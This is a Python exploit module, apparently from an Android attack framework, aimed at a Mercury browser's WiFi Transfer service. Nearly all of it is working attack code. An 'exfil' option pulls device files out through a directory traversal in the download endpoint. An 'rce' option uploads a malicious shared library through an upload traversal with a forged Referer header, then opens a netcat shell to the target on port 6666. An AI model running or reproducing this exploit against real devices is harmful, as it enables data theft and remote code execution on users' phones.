import requests
import time
import os
import netifaces
from subprocess import Popen
from framework.brains.exploits.browser.mercury.enum import MercuryEnum
from framework.logging.logger import Logger
from datetime import datetime
from blessings import Terminal
t = Terminal()


class MercuryWFM(object):

    name = "mercury"
    module = "wfm"

    def __init__(self):

        super(MercuryWFM, self).__init__()

    def exploit(self):

        """
        Remote Code Execution and Data Exfiltration through the directory traversal vulnerability
        in the WiFi Transfer service
        """

        # TODO
        # Holy fucking enum(s) batman!!!

        # Setup locals
        ip = None
        poll = True
        target = None
        active = False

        while poll:
            for iface in netifaces.interfaces():
                if iface == "en0":
                    # TODO
                    # Additional code is needed for Linux based interface names
                    #
                    ip = netifaces.ifaddresses("en0")[2][0]["addr"]
                    # Build web service endpoint
                    web_service = "http://{0}:5000/exploits/mercury/wfm/check".format(ip)

                    print(t.green("[{0}] ".format(datetime.now()) +
                                  t.yellow("Polling ...")))
                    try:
                        r = requests.get(web_service)
                        if r.text == "Not Engaged":
                            time.sleep(2)
                            continue
                        else:
                            # Response should contain
                            # device IP address
                            #
                            target = r.text
                            print(t.green("[{0}] ".format(datetime.now())) +
                                  t.yellow("Exploit ready! Target IP : ") + target)
                            active = True
                            poll = False
                    # Handle all the possible connection based exceptions
                    except requests.HTTPError as http_error:
                        print(t.red("[{0}] ".format(datetime.now()) +
                                    t.white("Could not connect to the web service endpoint!")))
                        print(t.red("[{0}] ".format(datetime.now()) + t.white("Exiting exploit ...")))
                        Logger.run_logger(http_error.message)
                        poll = False
                    except requests.ConnectionError as connection_error:
                        print(t.red("[{0}] ".format(datetime.now()) +
                                    t.white("Could not connect to the web service endpoint!")))
                        print(t.red("[{0}] ".format(datetime.now()) + t.white("Exiting exploit ...")))
                        Logger.run_logger(connection_error.message)
                        poll = False

        if active:
            while True:
                # If the WFM Transfer service is up and running let's do this shit!
                print(t.green("[{0}] ".format(datetime.now()) +
                              t.yellow("Available exploit option: ") + "rce"))
                print(t.green("[{0}] ".format(datetime.now()) +
                              t.yellow("Available exploit option: ") + "exfil"))

                # Exploit option
                option = raw_input(t.green("[{0}] ".format(datetime.now()) + t.yellow("Enter option: ")))

                # Browser data exfiltration
                if option == "exfil":
                    # Setup requests
                    # parameters
                    #
                    url = "".join(["http://{0}:8888/dodownload?fname=".format(ip), MercuryEnum().dir_trav_path_download])
                    headers = {"Referer": "http://{0}:8888/".format(ip)}

                    try:
                        for f in MercuryEnum.files:
                            print(t.green("[{0}] ".format(datetime.now()) + t.yellow("Retrieving ") + "{0}".format(f)))
                            # This is the local directory for storing the exfil data
                            local = "".join([os.getcwd(), MercuryEnum.download_dir, f.split("/")[-1]])
                            r = requests.get("".join([url, f]), headers=headers, stream=True)
                            if r.status_code == 200:
                                with open(local, "wb") as l:
                                    for data in r.iter_content(chunk_size=1024):
                                        l.write(data)
                                        l.flush()
                            break
                    # Handle all the possible connection based exceptions
                    except requests.HTTPError as e:
                        print(t.red("[{0}] ".format(datetime.now()) + t.white("Http error, check logs!")))
                        Logger.run_logger(e.message)
                        break
                    except requests.ConnectionError as e:
                        print(t.red("[{0}] ".format(datetime.now()) + t.white("Connection error, check logs!")))
                        # Unicode error
                        #
                        Logger.run_logger(e.message[0])
                        break

                # RCE with arbitrary write primitive
                if option == "rce":
                    # Build request components
                    # The referer is set as a bypass
                    url = "".join(["http://{0}:8888/doupload?dir=".format(target), MercuryEnum().dir_trav_path_upload])
                    headers = {"Referer": "http://{0}:8888/".format(target)}
                    files = {"libvplayer.so": open(
                        "".join([os.getcwd(), "/framework/brains/exploits/browser/mercury/wfm/libvplayer.so"]), "rb")}

                    print(t.green("[{0}] ".format(datetime.now()) + t.yellow("Performing directory traversal ...")))

                    try:
                        r = requests.post(url, headers=headers, files=files)
                        if r.status_code == 200:
                            print(t.green("[{0}] ".format(datetime.now()) +
                                          t.yellow("Directory traversal successful!")))
                            # You will need to load up
                            raw_input(t.green("[{0}] ".format(datetime.now()) +
                                              t.yellow("[ENTER] Connect to the shell ... (!)")))
                            # TODO
                            # Actually implement all of this in sockets
                            #
                            nc = Popen(["nc {0} 6666".format(target)], shell=True).wait()
                            break
                        else:
                            # If this fails, it usually means the shared libraries for the SDK were not
                            # created yet ...
                            print(t.red("[{0}] ".format(datetime.now()) + t.white("Exploit failed!")))
                            break
                    # Handle all the possible connection based exceptions
                    except requests.ConnectionError as connection_error:
                        print(t.red("[{0}] ".format(datetime.now()) + t.white("Exploit failed!")))
                        print(t.red("[{0}] ".format(datetime.now()) + t.white("Exiting exploit ...")))
                        Logger.run_logger(connection_error.message)
                        break


